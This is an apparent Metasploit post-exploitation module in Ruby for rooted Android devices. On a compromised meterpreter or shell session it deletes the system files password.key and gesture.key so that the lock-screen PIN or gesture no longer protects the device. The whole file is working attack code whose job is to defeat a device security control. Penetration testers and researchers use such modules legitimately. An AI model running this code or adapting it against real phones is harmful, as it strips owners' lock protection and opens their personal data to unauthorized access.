##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Common
  include Msf::Post::Android::Priv

  def initialize(info={})
    super( update_info( info, {
        'Name'          => "Android Root Remove Device Locks (root)",
        'Description'   => %q{
            This module uses root privileges to remove the device lock.
            In some cases the original lock method will still be present but any key/gesture will
            unlock the device.
        },
        'Privileged'    => true,
        'License'       => MSF_LICENSE,
        'Author'        => [ 'timwr' ],
        'SessionTypes'  => [ 'meterpreter', 'shell' ],
        'Platform'      => 'android',
      }
    ))
  end

  def run
    unless is_root?
      print_error("This module requires root permissions.")
      return
    end

    %W{
      /data/system/password.key
      /data/system/gesture.key
    }.each do |path|
      print_status("Removing #{path}")
      cmd_exec("rm #{path}")
    end

    print_status("Device should be unlocked or no longer require a pin")
  end
end

